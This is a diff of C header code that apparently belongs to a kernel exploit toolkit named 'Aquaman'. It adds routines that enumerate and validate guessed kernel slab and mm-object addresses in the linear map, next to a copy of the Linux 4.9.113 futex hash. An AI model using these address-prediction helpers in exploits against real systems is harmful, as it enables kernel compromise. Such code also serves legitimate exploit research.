@@ -132,11 +132,15 @@ static inline int aq_slab_excluded(uint64_t slab_base)
     return 0;
 }
 
+/* ---- Physical range (no PAGE_OFFSET here) ---- */
 static inline int aq_phys_in_usable(uint64_t phys)
 {
     return phys >= AQ_PHYS_START && phys < AQ_PHYS_END;
 }
 
+/* ---- Slab geometry (physical only) ---- */
+
+/* ---- Virtual linear-map conversion (only entry point using PAGE_OFFSET) ---- */
 static inline uint64_t aq_phys_to_virt(uint64_t phys)
 {
     return AQ_PAGE_OFFSET + phys;
@@ -149,6 +153,8 @@ static inline int aq_virt_in_linear(uint64_t vaddr)
 
     return vaddr >= lo && vaddr < hi;
 }
+
+/* ---- Object geometry is AQ_MM_OFFSET/STRIDE/OBJS (see aq_slot_valid) ---- */
 
 /* Validate one slot. Returns 1 if usable, 0 otherwise. */
 static inline int aq_slot_valid(uint64_t slab_base, uint64_t object_offset,
@@ -185,8 +191,146 @@ static inline int aq_slot_valid(uint64_t slab_base, uint64_t object_offset,
     return 1;
 }
 
+/* ---- Candidate record: keeps the four concepts separate ----
+ * phys_slab / phys_mm / slot are physical + object geometry;
+ * virt_mm is derived only via aq_phys_to_virt() after validation.
+ * Print with: phys_slab=0x%llx phys_mm=0x%llx slot=%u virt_mm=0x%llx */
+struct aq_candidate {
+    uint64_t phys_slab;
+    uint64_t phys_mm;
+    unsigned slot;
+    uint64_t virt_mm;
+};
+
+/* Build a candidate from physical slab + slot. Physical walk only;
+ * PAGE_OFFSET enters solely through aq_phys_to_virt() at the end.
+ * Returns 1 on usable candidate, 0 otherwise. */
+static inline int aq_candidate_make(uint64_t slab_base, unsigned slot,
+                                    struct aq_candidate *out)
+{
+    uint64_t phys = 0;
+
+    if (slab_base % AQ_MM_SLAB_SIZE != 0)
+        return 0;
+    if (!aq_slot_valid(slab_base, AQ_MM_OFFSET, slot, &phys))
+        return 0;
+    if (aq_slab_excluded(slab_base))
+        return 0;
+    if (out) {
+        out->phys_slab = slab_base;
+        out->phys_mm = phys;
+        out->slot = slot;
+        out->virt_mm = aq_phys_to_virt(phys);
+    }
+    return 1;
+}
+
+/* Reverse: prove a virt_mm came from the grid. Returns 1 + fills out. */
+static inline int aq_candidate_from_virt(uint64_t virt_mm,
+                                         struct aq_candidate *out)
+{
+    uint64_t phys, slab_base, rel;
+    unsigned slot;
+
+    if (!aq_virt_in_linear(virt_mm))
+        return 0;
+    phys = virt_mm - AQ_PAGE_OFFSET;
+    if (!aq_phys_in_usable(phys))
+        return 0;
+    slab_base = phys & ~(AQ_MM_SLAB_SIZE - 1ULL);
+    if (slab_base % AQ_MM_SLAB_SIZE != 0)
+        return 0;
+    if (aq_slab_excluded(slab_base))
+        return 0;
+    if (phys < slab_base + AQ_MM_OFFSET)
+        return 0;
+    rel = phys - slab_base - AQ_MM_OFFSET;
+    if (rel % AQ_MM_STRIDE != 0)
+        return 0;
+    slot = (unsigned)(rel / AQ_MM_STRIDE);
+    if (slot >= AQ_MM_OBJS)
+        return 0;
+    if (slab_base + AQ_MM_OFFSET + (uint64_t)slot * AQ_MM_STRIDE != phys)
+        return 0;
+    if (out) {
+        out->phys_slab = slab_base;
+        out->phys_mm = phys;
+        out->slot = slot;
+        out->virt_mm = virt_mm;
+    }
+    return 1;
+}
+
+/* Full validation: slab valid + slot is one of the 19 + no reserve cross. */
+static inline int aq_candidate_valid(const struct aq_candidate *c)
+{
+    uint64_t expect_phys = 0;
+
+    if (!c)
+        return 0;
+    if (c->phys_slab % AQ_MM_SLAB_SIZE != 0)
+        return 0;
+    if (c->slot >= AQ_MM_OBJS)
+        return 0;
+    if (!aq_slot_valid(c->phys_slab, AQ_MM_OFFSET, c->slot, &expect_phys))
+        return 0;
+    if (expect_phys != c->phys_mm)
+        return 0;
+    if (aq_slab_excluded(c->phys_slab))
+        return 0;
+    if (!aq_phys_in_usable(c->phys_mm))
+        return 0;
+    if (c->virt_mm != aq_phys_to_virt(c->phys_mm))
+        return 0;
+    if (!aq_virt_in_linear(c->virt_mm))
+        return 0;
+    return 1;
+}
+
+/* Physical enumerator: iterate slab_base step 0x4000, slot 0..18.
+ * Keeps PAGE_OFFSET out of the walk; conversion happens in
+ * aq_candidate_make() only. Returns 1 + fills out, 0 at end. */
+struct aq_enum {
+    uint64_t slab;
+    unsigned slot;
+};
+
+static inline void aq_enum_init(struct aq_enum *e)
+{
+    e->slab = AQ_PHYS_START;
+    e->slot = 0;
+}
+
+static inline int aq_enum_next(struct aq_enum *e, struct aq_candidate *out)
+{
+    struct aq_candidate c;
+
+    while (e->slab < AQ_PHYS_END) {
+        if (e->slot >= AQ_MM_OBJS) {
+            e->slot = 0;
+            e->slab += AQ_MM_SLAB_SIZE;
+            continue;
+        }
+        if (aq_candidate_make(e->slab, e->slot, &c)) {
+            if (out)
+                *out = c;
+            e->slot++;
+            if (e->slot >= AQ_MM_OBJS) {
+                e->slot = 0;
+                e->slab += AQ_MM_SLAB_SIZE;
+            }
+            return 1;
+        }
+        e->slot++;
+        if (e->slot >= AQ_MM_OBJS) {
+            e->slot = 0;
+            e->slab += AQ_MM_SLAB_SIZE;
+        }
+    }
+    return 0;
+}
+
 /* ---- Aquaman futex hash (4-word jhash2, kernel 4.9.113 hash_futex) ---- */
-/* Preserved Aquaman implementation. NOT Hazel's 3-word ks_hash. */
 static inline uint32_t aq_rol32(uint32_t v, unsigned n)
 {
     return (v << n) | (v >> (32 - n));
